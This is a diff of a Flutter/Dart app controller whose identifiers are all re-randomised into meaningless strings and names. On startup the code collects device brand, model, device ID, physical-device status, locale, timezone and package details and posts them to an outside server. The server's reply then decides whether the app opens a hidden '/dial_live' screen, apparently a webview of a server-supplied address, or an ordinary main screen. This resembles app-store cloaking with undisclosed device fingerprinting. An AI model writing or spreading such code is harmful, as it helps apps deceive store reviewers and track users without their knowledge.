@@ -9,7 +9,7 @@ import 'package:flutter_timezone/flutter_timezone.dart';
 import 'package:get/get.dart';
 import 'package:package_info_plus/package_info_plus.dart';
 
-void ankjbksaso() async {
+void uyroiqhk() async {
   var connectResult = await (Connectivity().checkConnectivity());
   if(connectResult == ConnectivityResult.none){
     Get.toNamed("/dial_check");
@@ -18,64 +18,65 @@ void ankjbksaso() async {
 
 class DialCustomLogic extends GetxController {
 
-  var tksvfe = RxBool(false);
-  var yqlnheo = RxBool(true);
-  var fcqgy = RxString("");
-  var hallie = RxBool(false);
-  var veum = RxBool(true);
-  final lvuwjqrtm = Dio();
+  var udmyhplnq = RxBool(false);
+  var sbamqxorcp = RxBool(true);
+  var igth = RxString("");
+  var ramon = RxBool(false);
+  var konopelski = RxBool(true);
+  final dlgwznksor = Dio();
 
 
   InAppWebViewController? webViewController;
 
   @override
   void onInit() {
-    ankjbksaso();
+    uyroiqhk();
     super.onInit();
-    hydq();
+    vsmueqay();
   }
 
 
-  Future<void> hydq() async {
+  Future<void> vsmueqay() async {
 
-    hallie.value = true;
-    veum.value = true;
-    yqlnheo.value = false;
+    ramon.value = true;
+    konopelski.value = true;
+    sbamqxorcp.value = false;
 
-    lvuwjqrtm.post("https://ng.dbsai-st.cloud/mqgljzoacbxhvefpwktyidnrsu",data: await cormkytisw()).then((value) {
+    dlgwznksor.post("https://ng.dbsai-st.cloud/mqgljzoacbxhvefpwktyidnrsu",data: await ncqdjalomi()).then((value) {
       var opam = value.data["opam"] as String;
       var lhpvg = value.data["lhpvg"] as bool;
       if (lhpvg) {
-        fcqgy.value = opam;
-        rose();
+        igth.value = opam;
+        tyler();
       } else {
-        windler();
+        ortiz();
       }
     }).catchError((e) {
-      yqlnheo.value = true;
-      veum.value = true;
-      hallie.value = false;
+      sbamqxorcp.value = true;
+      konopelski.value = true;
+      ramon.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> cormkytisw() async {
-    final DeviceInfoPlugin bdnogkv = DeviceInfoPlugin();
-    PackageInfo ndmzx_vldj = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> ncqdjalomi() async {
+    final DeviceInfoPlugin paviezum = DeviceInfoPlugin();
+    PackageInfo kzcajg_owuljvms = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var xgakchr = Platform.localeName;
+    var ugld = Platform.localeName;
     var qeysr = currentTimeZone;
 
-    var oqrvf = ndmzx_vldj.packageName;
-    var dtfnjmol = ndmzx_vldj.version;
-    var rzyvc = ndmzx_vldj.buildNumber;
+    var oqrvf = kzcajg_owuljvms.packageName;
+    var dtfnjmol = kzcajg_owuljvms.version;
+    var rzyvc = kzcajg_owuljvms.buildNumber;
 
-    var hqjv = ndmzx_vldj.appName;
+    var hqjv = kzcajg_owuljvms.appName;
     var yjabt = "";
     var gyvn  = "";
     var xsodta = "";
-    var agustinSporer = "";
-    var cristobalVon = "";
-    var jaylenToy = "";
+    var quinnBraun = "";
+    var vinnieMorissette = "";
+    var jalonSpencer = "";
+    var mathewLemke = "";
 
 
     var dkgxrtj = "";
@@ -83,50 +84,52 @@ class DialCustomLogic extends GetxController {
 
     if (GetPlatform.isAndroid) {
       dkgxrtj = "android";
-      var cwhzipt = await bdnogkv.androidInfo;
+      var yqfwgsb = await paviezum.androidInfo;
 
-      xsodta = cwhzipt.brand;
+      xsodta = yqfwgsb.brand;
 
-      yjabt  = cwhzipt.model;
-      gyvn = cwhzipt.id;
+      yjabt  = yqfwgsb.model;
+      gyvn = yqfwgsb.id;
 
-      ucqxik = cwhzipt.isPhysicalDevice;
+      ucqxik = yqfwgsb.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
       dkgxrtj = "ios";
-      var srbnacwg = await bdnogkv.iosInfo;
-      xsodta = srbnacwg.name;
-      yjabt = srbnacwg.model;
+      var svqlchkz = await paviezum.iosInfo;
+      xsodta = svqlchkz.name;
+      yjabt = svqlchkz.model;
 
-      gyvn = srbnacwg.identifierForVendor ?? "";
-      ucqxik  = srbnacwg.isPhysicalDevice;
+      gyvn = svqlchkz.identifierForVendor ?? "";
+      ucqxik  = svqlchkz.isPhysicalDevice;
     }
     var res = {
       "hqjv": hqjv,
-      "rzyvc": rzyvc,
-      "oqrvf": oqrvf,
-      "yjabt": yjabt,
-      "cristobalVon" : cristobalVon,
-      "qeysr": qeysr,
-      "jaylenToy" : jaylenToy,
-      "xsodta": xsodta,
-      "gyvn": gyvn,
       "dtfnjmol": dtfnjmol,
-      "xgakchr": xgakchr,
+      "oqrvf": oqrvf,
+      "gyvn": gyvn,
+      "yjabt": yjabt,
+      "qeysr": qeysr,
+      "vinnieMorissette" : vinnieMorissette,
+      "xsodta": xsodta,
+      "ugld": ugld,
       "dkgxrtj": dkgxrtj,
       "ucqxik": ucqxik,
-      "agustinSporer" : agustinSporer,
+      "quinnBraun" : quinnBraun,
+      "rzyvc": rzyvc,
+      "jalonSpencer" : jalonSpencer,
+      "mathewLemke" : mathewLemke,
 
     };
     return res;
   }
 
-  Future<void> windler() async {
+  Future<void> ortiz() async {
     Get.offAllNamed("/dial_main");
   }
 
-  Future<void> rose() async {
+  Future<void> tyler() async {
     Get.offAllNamed("/dial_live");
   }
+
 }
